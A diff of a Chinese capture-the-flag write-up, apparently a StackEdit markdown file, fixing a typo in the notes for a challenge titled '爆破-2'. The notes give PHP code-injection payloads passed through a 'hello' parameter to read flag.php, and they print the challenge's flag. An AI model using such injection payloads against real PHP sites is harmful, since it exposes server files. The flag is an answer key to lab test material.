@@ -13,12 +13,12 @@ show_source(__FILE__);
 # 爆破-2
 同样的题,解法不同
 构造 payload:`?hello=file_get_contents('flag.php')` 提交,`Ctrl+U` 查看源码得到 flag:`flag{45026846-5a96-4f26-bc7a-1b80077b81d7}` 
-以下junj
+以下均可
 `file_get_contents('flag.php')`
 `file('flag.php')`
 `show_source('flag.php')`
 # 爆破-3
 <!--stackedit_data:
-eyJoaXN0b3J5IjpbLTUzMjk0NzIxNywtMTc4Njk2NDMyOCw0NT
+eyJoaXN0b3J5IjpbMTk4MjEwMjkyNiwtMTc4Njk2NDMyOCw0NT
 kzOTYxNTVdfQ==
 -->
